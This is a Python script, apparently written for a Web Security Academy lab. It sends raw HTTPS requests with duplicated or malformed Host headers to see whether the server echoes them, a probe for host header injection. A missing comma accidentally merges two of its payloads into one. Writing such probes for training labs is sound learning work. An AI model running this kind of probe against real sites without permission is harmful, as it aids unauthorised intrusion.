import ssl, socket

host = "0a33007304d4161d8066032900850097.web-security-academy.net"
payloadsList = [
    "Host : foo/bar",
    "   Host: foo/bar"
    " Host: foo/bar",
    '''Host: 
    foo/bar''',
    '''Host: 
     foo/bar'''
]

def createSecureSocket(hostname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock = ssl.create_default_context().wrap_socket(sock, server_hostname=hostname)
    ssock.connect((hostname, 443))
    return ssock

def requestToHost_InSocket_WithData_(host, secureSocket, data):
    secureSocket.send(bytes(data, 'utf-8'))
    return secureSocket.recv(1024).decode('utf-8')

def createCheckRequestForHost_WithPayload_(hostname, payload):
    return f"GET / HTTP/1.1\r\nHost: {hostname}\r\n{payload}\r\n\r\n"

def checkPayloadsIn_ForHost_(payloadsList, host):
    for payload in payloadsList:
        r = requestToHost_InSocket_WithData_(host, createSecureSocket(host), createCheckRequestForHost_WithPayload_(host, payload))
        print(f"\n\tPayload -> \"{payload}\"\n*\n{r}\n*\n") if "host" in r.lower() else None

checkPayloadsIn_ForHost_(payloadsList, host)
